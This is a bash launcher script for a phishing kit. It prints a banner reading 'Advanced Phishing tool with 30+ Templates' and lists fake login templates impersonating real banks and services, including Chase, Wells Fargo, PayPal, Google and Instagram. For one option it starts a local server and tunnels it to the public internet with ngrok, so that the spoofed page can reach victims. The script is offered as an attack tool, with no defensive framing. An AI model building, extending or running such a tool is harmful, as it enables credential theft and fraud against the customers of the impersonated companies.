#!/bin/bash

export COLOR_RESET="\e[0m"

# Text Colors
export WHITE_COLOR="\e[97m"
export BLUE_COLOR="\e[34m"

# Background Colors
export BRED_COLOR="\e[41m"

# Available Templates
templates=(
    'Chase Bank'
    'PNC'
    'Bank of America'
    'Royal Credit Union'
    'TD Bank'
    'Wells Fargo'
    'Amazon'
    'Github'
    'LinkedIn'
    'Google'
    'Apple'
    'iCloud'
    'Best Buy'
    'At&T'
    'Facebook'
    'Nike'
    'Snapchat'
    'Netflix'
    'PayPal'
    'Steam'
    'Twitter'
    'Adobe'
    'Ebay'
    'Twitch'
    'Dropbox'
    'CryptoCoin'
    'Yahoo'
    'Wordpress'
    'Webflow'
    'Spotify'
    'Clubhouse'
    'Instagram'
)

function banner() {
    clear

    printf "$COLOR_RESET\n$WHITE_COLOR Twitter | https://www.twitter.com/ant_devs $COLOR_RESET"
    printf "$COLOR_RESET\n$WHITE_COLOR~^~^~^~^~^~^~^~^~^~^~^~^^~^~^~^~^~^~^~^~^~^~$COLOR_RESET"     
    printf "$COLOR_RESET\n$BLUE_COLOR ██████  ██   ██ ██ ███████ ██   ██ ██    ██ $COLOR_RESET"
    printf "$COLOR_RESET\n$BLUE_COLOR ██   ██ ██   ██ ██ ██      ██   ██  ██  ██  $COLOR_RESET"
    printf "$COLOR_RESET\n$BLUE_COLOR ██████  ███████ ██ ███████ ███████   ████   $COLOR_RESET"
    printf "$COLOR_RESET\n$BLUE_COLOR ██      ██   ██ ██      ██ ██   ██    ██    $COLOR_RESET"
    printf "$COLOR_RESET\n$BLUE_COLOR ██      ██   ██ ██ ███████ ██   ██    ██    $COLOR_RESET"
    printf "$COLOR_RESET\n$WHITE_COLOR~^~^~^~^~^~^~^~^~^~^~^~^^~^~^~^~^~^~^~^~^~^~$COLOR_RESET" 
    printf "$COLOR_RESET\n$BRED_COLOR$WHITE_COLOR Advanced Phishing tool with 30+ Templates $COLOR_RESET\n"
    printf "$COLOR_RESET\n"   
}

function menuOptions() {
    printf "$COLOR_RESET$WHITE_COLOR Select A Template $COLOR_RESET$WHITE_COLOR"
    printf "\n$COLOR_RESET\n"

    for template in "${!templates[@]}"; do
        if (( $template < 10 )); then 
            printf "$COLOR_RESET$WHITE_COLOR[0$template] ${templates[$template]} $COLOR_RESET\n"
        else 
            printf "$COLOR_RESET$WHITE_COLOR[$template] ${templates[$template]} $COLOR_RESET\n"
        fi
    done

    printf "$COLOR_RESET$WHITE_COLOR[99] Exit $COLOR_RESET\n"

    read -p $'\e[34m[\e[94[~]\e[0m \e[97m Select an option: ' menu_option
}

banner

menuOptions

if [[ $menu_option == "06" ]]; then
    python app/server.py
    ngrok http 5003
fi